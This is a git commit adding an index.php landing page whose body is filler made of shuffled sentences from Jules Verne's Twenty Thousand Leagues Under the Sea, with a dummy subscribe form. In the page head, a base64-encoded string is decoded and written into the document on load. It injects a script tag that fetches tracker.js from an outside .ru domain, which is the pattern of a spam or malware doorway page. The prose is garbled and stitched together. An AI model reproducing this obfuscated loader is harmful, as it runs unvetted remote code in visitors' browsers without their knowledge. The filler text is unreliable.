2a2c8e8374c21e2d10f802452092b1e7962c5a9a
uctojarn <76976253+uctojarn@users.noreply.github.com>
2021-01-05 00:55:25 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Yes, my boy. There are some pintadines a perfect casket. On</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9xYXYwcG9hMjY0Z20iPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header>
+		<nav>
+			<li><a href="#">Home</a></li>
+			<li><a href="#">Products</a></li>
+			<li><a href="#">About</a></li>
+			<li><a href="#">Contacts</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Yes, my boy. There are some pintadines a perfect casket. On</h1>
+	</section>
+
+
+	<section class="our-work">
+		<h3 class="title">Not at all. This boat is attached to the upper part</h3>
+		<p>Ned was right, it was too beautiful. Suddenly a cry from Conseil made me turn. Monsieur Pierre Aronnax? said he. But everywhere the slave has the right to regain his liberty. Precisely, Ned; so that at 32 feet beneath the surface of the sea you would undergo a pressure of 97,500 lbs.; at 320 feet, ten times that pressure; at 3,200 feet, a hundred times that pressure; lastly, at 32,000 feet, a thousand times that pressure would be 97,500,000 lbs.-that is to say, that you would be flattened as if you had been drawn from the plates of an hydraulic machine!</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work">
+		<h3 class="title">The sea is bad.</h3>
+		<p>I had wished to visit the reef, 360 leagues long, against which the sea, always rough, broke with great violence, with a noise like thunder. But just then the inclined planes drew the Nautilus down to a great depth, and I could see nothing of the high coral walls. I had to content myself with the different specimens of fish brought up by the nets. I remarked, among others, some germons, a species of mackerel as large as a tunny, with bluish sides, and striped with transverse bands, that disappear with the animal's life. These fish followed us in shoals, and furnished us with very delicate food. We took also a large number of giltheads, about one and a half inches long, tasting like dorys; and flying pyrapeds like submarine swallows, which, in dark nights, light alternately the air and water with their phosphorescent light. Among the mollusks and zoophytes, I found in the meshes of the net several species of alcyonarians, echini, hammers, spurs, dials, cerites, and hyalle?. The flora was represented by beautiful floating seaweeds, laminari?, and macrocystes, impregnated with the mucilage that transudes through their pores; and among which I gathered an admirable Nemastoma Geliniarois, that was classed among the natural curiosities of the museum. During the night of the 27th or 28th of December, the Nautilus left the shores of Vanikoro with great speed. Her course was southwesterly, and in three days she had gone over the 750 leagues that separated it from La Perouse's group and the southeast point of Papua. Yes, sir. The iceberg has shifted, and closed every outlet. The price of these pearls varies according to their size? asked Conseil.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="title">They are either fighting or playing.</h3>	
+		<p>Three hurrahs greeted this order. The time for the struggle had arrived. Some moments after, the two funnels of the frigate vomited torrents of black smoke, and the bridge quaked under the trembling of the boilers. I have hesitated for some time, continued the commander; nothing obliged me to show you hospitality. If I chose to separate myself from you, I should have no interest in seeing you again; I could place you upon the deck of this vessel which has served you as a refuge, I could sink beneath the waters, and forget that you had ever existed. Would not that be my right? Oh, I could manufacture the air necessary for my consumption, but it is useless, because I go up to the surface of the water when I please. However, if electricity does not furnish me with air to breath, it works at least the powerful pumps that are stored in spacious reservoirs, and which enable me to prolong at need, and as long as I will, my stay in the depths of the sea. It gives a uniform and unintermittent light, which the sun does not. Now look at this clock; it is electrical, and goes with a regularity that defies the best chronometers. I have divided it into twenty-four hours, like the Italian clocks, because for me there is neither night nor day, sun nor moon, but only the factitious light that I take with me to the bottom of the sea. Look! just now, it is ten o'clock in the morning. The boat, rowed by strong arms, flew on its track. Several times it approached within some few yards, and the Canadian was ready to strike, but the dugong made off with a sudden plunge, and it was impossible to reach it.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="Email">
+			<input type="Name" placeholder="Name">
+			<input type="Surmane" placeholder="Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer>
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>113 Altenwerth View, Apt. 150, 26565, Lake Gia, Massachusetts, United States</p>
+	</footer>
+
+</body>
+
+</html>
